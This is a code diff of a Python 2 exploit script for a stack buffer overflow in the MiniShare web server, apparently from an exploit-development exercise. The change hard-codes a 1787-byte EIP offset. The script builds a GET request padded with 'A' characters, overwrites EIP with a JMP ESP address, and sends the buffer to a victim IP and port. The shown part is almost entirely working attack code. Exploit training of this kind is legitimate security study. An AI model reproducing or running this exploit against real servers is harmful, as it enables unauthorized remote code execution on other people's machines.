@@ -1,6 +1,6 @@
 #!/usr/bin/python
 
-
+## NOTE: minishare server uses port 80 
 
 import sys
 import argparse
@@ -12,17 +12,18 @@ program_description = "The program inputs ip and port of the victim pc"
 parser = argparse.ArgumentParser(program_description)
 parser.add_argument("target_ip", help="Target IP")
 parser.add_argument("target_port", type=int, help="Target Port")
-parser.add_argument("eip_offset", type=int, help="Eip offset at the moment of crash")
 args = parser.parse_args()
 
 # global parameters
-user_input = (args.target_ip, args.target_port, args.eip_offset)
+user_input = (args.target_ip, args.target_port)
 
 
 # function definitions
-def buffer_gen(eip_offset):
+def buffer_gen():
     buf = 'GET '
-    buf = buf + 'A' * eip_offset
+
+    # 1787 is the eip offset for this exploit
+    buf = buf + 'A' * 1787
     
     # adding the eip (memory of jmp esp)in format: reverse order due to endianess
     eip = "\xA4\x23\x49\x7E"
@@ -75,7 +76,7 @@ def socket_setup(ip, port):
 
 def main(input_tuple):          # Input tuple has the following structure: (ip, port, eipOffset)
     s = socket_setup(input_tuple[0], input_tuple[1])
-    buf = buffer_gen(input_tuple[2])
+    buf = buffer_gen()
 
     print "sending buffer: ", buf
     s.send(buf)
